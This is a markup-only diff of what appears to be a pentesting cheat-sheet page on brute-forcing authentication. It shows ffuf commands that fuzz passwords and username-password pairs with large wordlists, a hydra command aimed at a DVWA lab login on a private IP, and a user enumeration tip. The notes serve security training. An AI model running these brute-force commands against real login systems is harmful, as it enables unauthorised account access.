@@ -4558,18 +4558,24 @@
 
   <h1>Brute Forcing Authentication</h1>
 
-<p><strong>ffuf</strong>
-- Save request “copy to file” from burp - Replace “password” param with “FUZZ”
-- Run with no filter, determine invalid response size, add <code>fs &lt;SIZE&gt;</code> , re-run command
+<p><strong>ffuf</strong></p>
+<ul>
+<li>Save request “copy to file” from burp - Replace “password” param with “FUZZ”</li>
+<li>
+<p>Run with no filter, determine invalid response size, add <code>fs &lt;SIZE&gt;</code> , re-run command
 <div class="language-Python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">ffuf</span> <span class="o">-</span><span class="n">request</span> <span class="n">r</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">fs</span> <span class="o">&lt;</span><span class="n">SIZE</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">request</span><span class="o">-</span><span class="n">proto</span> <span class="n">http</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Passwords</span><span class="o">/</span><span class="n">xato</span><span class="o">-</span><span class="n">net</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="n">million</span><span class="o">-</span><span class="n">passwords</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span><span class="n">FUZZ</span>
 </span></code></pre></div>
-<strong>fuff - fuzz all permutations of multiple parameters (clusterbomb)</strong>
-- Modify the request with two keywords, append them to the proper wordlists
+<strong>fuff - fuzz all permutations of multiple parameters (clusterbomb)</strong></p>
+</li>
+<li>
+<p>Modify the request with two keywords, append them to the proper wordlists
 <div class="language-Python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">ffuf</span> <span class="o">-</span><span class="n">request</span> <span class="n">r</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">request</span><span class="o">-</span><span class="n">proto</span> <span class="n">http</span> <span class="o">-</span><span class="n">mode</span> <span class="n">clusterbomb</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Passwords</span><span class="o">/</span><span class="n">xato</span><span class="o">-</span><span class="n">net</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="n">million</span><span class="o">-</span><span class="n">passwords</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span><span class="n">FUZZPASS</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Usernames</span><span class="o">/</span><span class="n">top</span><span class="o">-</span><span class="n">usernames</span><span class="o">-</span><span class="n">shortlist</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span><span class="n">FUZZUSER</span>
 </span></code></pre></div>
 <strong>hydra</strong>
 <div class="language-Python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">hydra</span> <span class="o">-</span><span class="n">V</span> <span class="o">-</span><span class="n">L</span> <span class="o">../</span><span class="n">wordlists</span><span class="o">/</span><span class="n">users</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">P</span> <span class="o">../</span><span class="n">wordlists</span><span class="o">/</span><span class="k">pass</span><span class="o">.</span><span class="n">txt</span> <span class="mf">192.168.187.133</span> <span class="n">http</span><span class="o">-</span><span class="n">get</span><span class="o">-</span><span class="n">form</span> <span class="s2">&quot;/dvwa/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=Username and/or password incorrect.:H=Cookie\: PHPSESSID=XXXXX; security=low&quot;</span>
 </span></code></pre></div></p>
+</li>
+</ul>
 <h2 id="user-enumeration">User Enumeration</h2>
 <ul>
 <li>Check if response is different for failed username vs failed password</li>
